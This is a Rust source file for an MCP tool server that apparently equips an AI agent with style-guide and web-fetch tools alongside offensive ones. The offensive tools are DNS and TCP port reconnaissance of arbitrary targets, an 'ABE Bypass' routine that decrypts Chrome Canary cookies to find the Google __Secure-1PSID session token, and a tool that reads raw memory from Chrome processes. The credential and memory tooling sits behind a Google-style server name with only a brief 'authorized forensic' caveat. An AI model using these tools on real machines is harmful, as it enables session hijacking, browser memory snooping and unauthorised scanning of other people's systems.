use std::{
    net::SocketAddr,
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    time::{Duration, Instant},
};

use anyhow::Result;
use axum::{Json, Router, routing::get};
use rmcp::{
    ServiceExt, handler::server::wrapper::Parameters, schemars, tool, tool_router, transport::stdio,
};
use serde_json::json;
use sysinfo::System;

// ---------------------------------------------------------------------------
// Global uptime anchor (set once at server boot).
// ---------------------------------------------------------------------------
static START_INSTANT: std::sync::OnceLock<Instant> = std::sync::OnceLock::new();

// ---------------------------------------------------------------------------
// Request DTOs
// ---------------------------------------------------------------------------

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct DnsReconRequest {
    #[schemars(description = "The target domain to scan (e.g., google.com)")]
    pub domain: String,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct StyleGuideRequest {
    #[schemars(
        description = "The programming language or technical topic you need the style guide for."
    )]
    pub topic: String,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct WebFetchRequest {
    #[schemars(description = "The absolute URL of the webpage to fetch.")]
    pub url: String,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct ChromeAutopsyRequest {
    #[schemars(description = "Process ID of the target Chrome process.")]
    pub pid: u32,
    #[schemars(description = "Base memory address (decimal) to read. Defaults to 65536 (0x10000).")]
    pub address: Option<usize>,
    #[schemars(description = "Number of bytes to read. Capped at 4096. Defaults to 256.")]
    pub size: Option<usize>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct AdvancedReconRequest {
    #[schemars(description = "Target host or IP address to scan.")]
    pub target: String,
    #[schemars(description = "List of TCP ports to probe for open states.")]
    pub ports: Option<Vec<u16>>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct StartDashboardRequest {
    #[schemars(description = "The TCP port number for the dashboard server. Defaults to 3000.")]
    pub port: Option<u16>,
}

// ---------------------------------------------------------------------------
// MCP tool router
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct GoogleMcpServer;

#[tool_router(server_handler)]
impl GoogleMcpServer {
    // -----------------------------------------------------------------------
    // 1. coding_style_guide — real HTTP fetch via Jina reader proxy.
    // -----------------------------------------------------------------------
    #[tool(description = "Fetch official coding style guidelines for Google projects (Chromium, \
                          Android, C++, Python, TypeScript, etc.).")]
    async fn coding_style_guide(
        &self,
        Parameters(StyleGuideRequest { topic }): Parameters<StyleGuideRequest>,
    ) -> String {
        let mut map = std::collections::HashMap::new();
        map.insert("cpp", "https://google.github.io/styleguide/cppguide.html");
        map.insert("python", "https://google.github.io/styleguide/pyguide.html");
        map.insert("typescript", "https://google.github.io/styleguide/tsguide.html");
        map.insert("javascript", "https://google.github.io/styleguide/jsguide.html");
        map.insert("java", "https://google.github.io/styleguide/javaguide.html");
        map.insert("shell", "https://google.github.io/styleguide/shellguide.html");
        map.insert("html", "https://google.github.io/styleguide/htmlcssguide.html");
        map.insert("android_build", "https://source.android.com/setup/contribute/code-style");
        map.insert(
            "chromium_build_win",
            "https://chromium.googlesource.com/chromium/src/+/master/docs/\
             windows_build_instructions.md",
        );
        map.insert("general", "https://google.github.io/styleguide/");

        let target_url =
            map.get(topic.as_str()).copied().unwrap_or("https://google.github.io/styleguide/");

        match reqwest::get(format!("https://r.jina.ai/{target_url}")).await {
            Ok(resp) => match resp.text().await {
                Ok(text) => format!("Source: {target_url}\n\n{text}"),
                Err(e) => format!("Error reading response: {e}"),
            },
            Err(e) => format!("Error fetching URL: {e}"),
        }
    }

    // -----------------------------------------------------------------------
    // 2. universal_web_fetch — real HTTP fetch via Jina reader proxy.
    // -----------------------------------------------------------------------
    #[tool(description = "Fetch any webpage from the internet and convert it to clean Markdown. \
                          Highly recommended for reading online developer documentation, issue \
                          trackers, or tutorials.")]
    async fn universal_web_fetch(
        &self,
        Parameters(WebFetchRequest { url }): Parameters<WebFetchRequest>,
    ) -> String {
        match reqwest::get(format!("https://r.jina.ai/{url}")).await {
            Ok(resp) => match resp.text().await {
                Ok(text) => text,
                Err(e) => format!("Error reading response: {e}"),
            },
            Err(e) => format!("Error fetching URL: {e}"),
        }
    }

    // -----------------------------------------------------------------------
    // 3. dns_recon — real DNS OSINT via the backend crate.
    // -----------------------------------------------------------------------
    #[tool(description = "Execute the DNS OSINT Reconnaissance pipeline. It returns JSON \
                          formatted OSINT data about a specific domain.")]
    async fn dns_recon(
        &self,
        Parameters(DnsReconRequest { domain }): Parameters<DnsReconRequest>,
    ) -> String {
        let recon = backend::dns::DnsRecon::new();
        match recon.run_osint(&domain).await {
            Ok(results) => format!(
                "DNS Recon completed. Found {} unique subdomains:\n{:#?}",
                results.len(),
                results
            ),
            Err(e) => format!("Error during DNS Recon: {e}"),
        }
    }

    // -----------------------------------------------------------------------
    // 4. auth_extract — Chrome Canary credential extraction. Windows-only: LOCALAPPDATA path +
    //    backend::chromium parser. Other platforms: explicit unsupported message.
    // -----------------------------------------------------------------------
    #[tool(description = "Execute Forensic Auth Extraction (ABE Bypass). Use only for authorized \
                          forensic investigation. Windows-only: reads Chrome Canary \
                          DPAPI-wrapped cookies from the local user profile.")]
    async fn auth_extract(&self) -> String {
        #[cfg(target_os = "windows")]
        {
            let local_app_data = match std::env::var("LOCALAPPDATA") {
                Ok(v) if !v.is_empty() => v,
                _ => {
                    return "Error: LOCALAPPDATA environment variable is not set or empty."
                        .to_string();
                },
            };
            let canary_data =
                std::path::PathBuf::from(local_app_data).join("Google/Chrome SxS/User Data");

            if !canary_data.exists() {
                return "Chrome Canary profile directory not found. Is Chrome Canary installed?"
                    .to_string();
            }

            let mut parser = backend::chromium::ChromiumParser::new(canary_data);
            if parser.load_master_key().is_err() {
                return "Master key extraction failed. Run as the profile owner.".to_string();
            }

            let profiles = parser.get_profiles();
            for profile in profiles {
                match parser.get_cookies(&profile, "google.com") {
                    Ok(cookies) => {
                        if let Some((..)) = cookies.iter().find(|(n, _)| n == "__Secure-1PSID") {
                            return format!(
                                "Token __Secure-1PSID found in profile '{profile}'.\nAuth \
                                 Extraction successful."
                            );
                        }
                    },
                    Err(e) => {
                        tracing::warn!("Cookie read error for profile '{profile}': {e}");
                    },
                }
            }
            "No valid __Secure-1PSID token found in Chrome Canary profiles.".to_string()
        }

        #[cfg(not(target_os = "windows"))]
        {
            "Chrome credential extraction is not supported on this platform. Windows only (Chrome \
             Canary + DPAPI)."
                .to_string()
        }
    }

    // -----------------------------------------------------------------------
    // 5. chrome_autopsy — real process memory read. Windows: OpenProcess + ReadProcessMemory (Win32
    //    API). Linux/macOS/wasm: platform not supported.
    // -----------------------------------------------------------------------
    #[tool(description = "Read raw bytes from a target Chrome process via OS memory APIs. \
                          Windows only: uses ReadProcessMemory. Other platforms report \
                          unsupported.")]
    async fn chrome_autopsy(
        &self,
        Parameters(ChromeAutopsyRequest { pid, address, size }): Parameters<ChromeAutopsyRequest>,
    ) -> String {
        let base_addr = address.unwrap_or(0x10000_usize);
        // Cap at 4096 to avoid excessive reads.
        let read_size = size.unwrap_or(256).min(4096);

        #[cfg(target_os = "windows")]
        {
            use windows::Win32::{
                Foundation::{CloseHandle, HANDLE},
                System::{
                    Diagnostics::Debug::ReadProcessMemory,
                    Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
                },
            };

            // SAFETY: All preconditions documented inline.
            // - `OpenProcess` returns INVALID_HANDLE_VALUE on failure; we check `.is_err()`.
            // - `ReadProcessMemory` writes into `buf` which is sized `read_size`;
            //   `lpnumberofbytesread` reports actual bytes written — we never read beyond that
            //   count.
            // - `CloseHandle` is always called via a guard, preventing handle leaks.
            unsafe {
                let handle: HANDLE =
                    match OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid) {
                        Ok(h) => h,
                        Err(e) => {
                            return format!(
                                "OpenProcess(pid={pid}) failed: {e}. Check that the process \
                                 exists and you have sufficient privileges."
                            );
                        },
                    };

                // Ensure the handle is closed even if we return early.
                struct HandleGuard(HANDLE);
                impl Drop for HandleGuard {
                    fn drop(&mut self) {
                        // SAFETY: self.0 is a valid open handle obtained from OpenProcess.
                        unsafe {
                            let _ = CloseHandle(self.0);
                        }
                    }
                }
                let _guard = HandleGuard(handle);

                let mut buf = vec![0u8; read_size];
                let mut bytes_read: usize = 0;

                let result = ReadProcessMemory(
                    handle,
                    base_addr as *const std::ffi::c_void,
                    buf.as_mut_ptr().cast(),
                    read_size,
                    Some(&mut bytes_read as *mut usize),
                );

                if let Err(e) = result {
                    return format!(
                        "ReadProcessMemory(pid={pid}, addr=0x{base_addr:x}, size={read_size}) \
                         failed: {e}"
                    );
                }

                buf.truncate(bytes_read);
                let hex: String = buf
                    .chunks(16)
                    .enumerate()
                    .map(|(i, chunk)| {
                        let offset = base_addr + i * 16;
                        let hex_part: String = chunk.iter().map(|b| format!("{b:02x} ")).collect();
                        let ascii_part: String = chunk
                            .iter()
                            .map(|&b| if (0x20..0x7f).contains(&b) { b as char } else { '.' })
                            .collect();
                        format!("0x{offset:08x}  {hex_part:<48}  {ascii_part}")
                    })
                    .collect::<Vec<_>>()
                    .join("\n");

                format!(
                    "ReadProcessMemory success:\n- PID:          {pid}\n- Base address: \
                     0x{base_addr:x}\n- Bytes read:   {bytes_read}\n\n{hex}"
                )
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            // Suppress unused-variable warnings on non-Windows.
            let _ = (pid, base_addr, read_size);
            "chrome_autopsy: ReadProcessMemory is not supported on this platform. Windows only."
                .to_string()
        }
    }

    // -----------------------------------------------------------------------
    // 6. advanced_recon — real DNS resolution + TCP port probing.
    // -----------------------------------------------------------------------
    #[tool(description = "Perform deep DNS, TCP, and OSINT reconnaissance using native \
                          high-speed networking.")]
    async fn advanced_recon(
        &self,
        Parameters(AdvancedReconRequest { target, ports }): Parameters<AdvancedReconRequest>,
    ) -> String {
        let ports_to_check = ports.unwrap_or_else(|| vec![80, 443, 8080]);
        let mut output = format!("Reconnaissance on {target}:\n");

        // Real DNS resolution via std::net — calls the OS resolver.
        match std::net::ToSocketAddrs::to_socket_addrs(&format!("{target}:80")) {
            Ok(addrs) => {
                let ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect();
                output.push_str(&format!("[DNS] A/AAAA records: {}\n", ips.join(", ")));
            },
            Err(e) => output.push_str(&format!("[DNS] Resolution failed: {e}\n")),
        }

        output.push_str(&format!("\n[TCP] Probing ports {ports_to_check:?}:\n"));
        for port in ports_to_check {
            let addr_str = format!("{target}:{port}");
            match addr_str.parse::<SocketAddr>() {
                Ok(addr) => {
                    match std::net::TcpStream::connect_timeout(&addr, Duration::from_millis(200)) {
                        Ok(_) => output.push_str(&format!("  Port {port}: OPEN\n")),
                        Err(_) => output.push_str(&format!("  Port {port}: CLOSED/FILTERED\n")),
                    }
                },
                Err(e) => {
                    // Target is likely a hostname, not an IP: resolve first.
                    match std::net::ToSocketAddrs::to_socket_addrs(&addr_str) {
                        Ok(mut addrs) => {
                            if let Some(resolved) = addrs.next() {
                                match std::net::TcpStream::connect_timeout(
                                    &resolved,
                                    Duration::from_millis(200),
                                ) {
                                    Ok(_) => output.push_str(&format!("  Port {port}: OPEN\n")),
                                    Err(_) => output
                                        .push_str(&format!("  Port {port}: CLOSED/FILTERED\n")),
                                }
                            } else {
                                output.push_str(&format!(
                                    "  Port {port}: DNS resolved but no address returned\n"
                                ));
                            }
                        },
                        Err(_) => {
                            output.push_str(&format!("  Port {port}: address parse error ({e})\n"));
                        },
                    }
                },
            }
        }

        output
    }

    // -----------------------------------------------------------------------
    // 7. native_hooks — real OS state query without WMI. Windows: GetSystemInfo +
    //    GlobalMemoryStatusEx (Win32 API). Linux: reads /proc/meminfo + /proc/cpuinfo via sysinfo
    //    crate. wasm: platform not supported.
    // -----------------------------------------------------------------------
    #[tool(description = "Query native OS state (CPU count, memory usage, page size) directly \
                          via OS APIs, bypassing WMI or higher-level abstractions.")]
    async fn native_hooks(&self) -> String {
        let pid = std::process::id();

        #[cfg(target_os = "windows")]
        {
            use windows::Win32::System::SystemInformation::{
                GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO,
            };

            // SAFETY:
            // - `GetSystemInfo` writes into a caller-allocated SYSTEM_INFO; all fields are valid
            //   after a successful call. No pointers escape.
            // - `GlobalMemoryStatusEx` requires `dwLength` pre-set to size of struct, which we do.
            //   It writes all fields on success; we check the return value.
            unsafe {
                let mut sys_info = SYSTEM_INFO::default();
                GetSystemInfo(&mut sys_info);

                let mut mem_status = MEMORYSTATUSEX {
                    dwLength: u32::try_from(std::mem::size_of::<MEMORYSTATUSEX>())
                        .unwrap_or(u32::MAX),
                    ..MEMORYSTATUSEX::default()
                };

                let mem_ok = GlobalMemoryStatusEx(&mut mem_status);

                let mem_info = if mem_ok.is_ok() {
                    format!(
                        "Total physical RAM:   {} MiB\n\
                         Available RAM:        {} MiB\n\
                         Memory load:          {}%\n\
                         Total virtual memory: {} MiB\n\
                         Available virtual:    {} MiB",
                        mem_status.ullTotalPhys / (1024 * 1024),
                        mem_status.ullAvailPhys / (1024 * 1024),
                        mem_status.dwMemoryLoad,
                        mem_status.ullTotalVirtual / (1024 * 1024),
                        mem_status.ullAvailVirtual / (1024 * 1024),
                    )
                } else {
                    "GlobalMemoryStatusEx failed.".to_string()
                };

                format!(
                    "OS State (Win32 native):\n- MCP Host PID:         {pid}\n- Logical CPU \
                     count:    {}\n- Active CPU mask:      0x{:x}\n- Page size:            {} \
                     bytes\n- Allocation granule:   {} bytes\n- Min app address:      {:#x}\n- \
                     Max app address:      {:#x}\n\nMemory:\n{mem_info}",
                    sys_info.dwNumberOfProcessors,
                    sys_info.dwActiveProcessorMask,
                    sys_info.dwPageSize,
                    sys_info.dwAllocationGranularity,
                    sys_info.lpMinimumApplicationAddress as usize,
                    sys_info.lpMaximumApplicationAddress as usize,
                )
            }
        }

        #[cfg(not(any(target_os = "windows", target_arch = "wasm32")))]
        {
            // Linux / macOS: use sysinfo (reads /proc on Linux, sysctl on macOS).
            let mut sys = System::new();
            sys.refresh_memory();

            let total_mb = sys.total_memory() / (1024 * 1024);
            let avail_mb = sys.available_memory() / (1024 * 1024);
            let used_mb = sys.used_memory() / (1024 * 1024);
            let cpu_count = System::physical_core_count().unwrap_or(0);

            format!(
                "OS State (sysinfo native):\n- MCP Host PID:     {pid}\n- Physical CPUs:    \
                 {cpu_count}\n- Total RAM:        {total_mb} MiB\n- Available RAM:    {avail_mb} \
                 MiB\n- Used RAM:         {used_mb} MiB\n- OS name:          {}\n- Kernel \
                 version:   {}\n- Host name:        {}",
                System::name().unwrap_or_else(|| "unknown".to_string()),
                System::kernel_version().unwrap_or_else(|| "unknown".to_string()),
                System::host_name().unwrap_or_else(|| "unknown".to_string()),
            )
        }

        #[cfg(target_arch = "wasm32")]
        {
            format!("native_hooks: OS-level system queries are not supported on wasm32. PID: {pid}")
        }
    }

    // -----------------------------------------------------------------------
    // 8. start_dashboard — real axum HTTP server spawned in a tokio task. Exposes GET /health and
    //    GET /info (PID, uptime, memory).
    // -----------------------------------------------------------------------
    #[tool(description = "Start a local HTTP server that exposes live forensic telemetry. \
                          Provides GET /health (liveness) and GET /info (PID, uptime, memory). \
                          The server runs in the background for the lifetime of the MCP process.")]
    async fn start_dashboard(
        &self,
        Parameters(StartDashboardRequest { port }): Parameters<StartDashboardRequest>,
    ) -> String {
        let port = port.unwrap_or(3000);
        let bind_addr: SocketAddr = match format!("0.0.0.0:{port}").parse() {
            Ok(a) => a,
            Err(e) => return format!("Invalid port {port}: {e}"),
        };

        // Shared atomic request counter for /info.
        let request_count = Arc::new(AtomicU64::new(0));
        let request_count_clone = Arc::clone(&request_count);
        let start = *START_INSTANT.get_or_init(Instant::now);

        let app = Router::new()
            .route(
                "/health",
                get(|| async {
                    Json(json!({
                        "status": "ok",
                        "service": "aphrody-mcp-dashboard"
                    }))
                }),
            )
            .route(
                "/info",
                get(move || {
                    let counter = Arc::clone(&request_count_clone);
                    async move {
                        counter.fetch_add(1, Ordering::Relaxed);
                        let uptime_secs = start.elapsed().as_secs();
                        let pid = std::process::id();

                        let mut sys = System::new();
                        sys.refresh_memory();
                        let used_mb = sys.used_memory() / (1024 * 1024);
                        let total_mb = sys.total_memory() / (1024 * 1024);

                        Json(json!({
                            "pid": pid,
                            "uptime_seconds": uptime_secs,
                            "memory_used_mib": used_mb,
                            "memory_total_mib": total_mb,
                            "requests_served": counter.load(Ordering::Relaxed),
                            "service": "aphrody-mcp-dashboard",
                        }))
                    }
                }),
            );

        let listener = match tokio::net::TcpListener::bind(bind_addr).await {
            Ok(l) => l,
            Err(e) => {
                return format!(
                    "Failed to bind dashboard on port {port}: {e}. Is the port already in use?"
                );
            },
        };

        // Confirm the actual bound address (OS may assign a different port if 0 was given).
        let bound_addr = match listener.local_addr() {
            Ok(a) => a,
            Err(e) => return format!("Failed to retrieve bound address: {e}"),
        };

        // Spawn the server as a background tokio task. It runs independently of the MCP loop.
        tokio::spawn(async move {
            if let Err(e) = axum::serve(listener, app).await {
                tracing::error!("Dashboard server error: {e}");
            }
        });

        format!(
            "Dashboard server started and listening on http://{bound_addr}\n\
             Routes:\n\
             - GET http://{bound_addr}/health  — liveness probe (JSON)\n\
             - GET http://{bound_addr}/info    — PID, uptime, memory (JSON)"
        )
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_writer(std::io::stderr).with_ansi(false).init();

    tracing::info!("Starting Aphrody MCP Server (Rust native)");

    // Anchor the uptime clock immediately.
    START_INSTANT.get_or_init(Instant::now);

    let service = GoogleMcpServer.serve(stdio()).await.inspect_err(|e| {
        tracing::error!("Serving error: {:?}", e);
    })?;

    service.waiting().await?;
    Ok(())
}
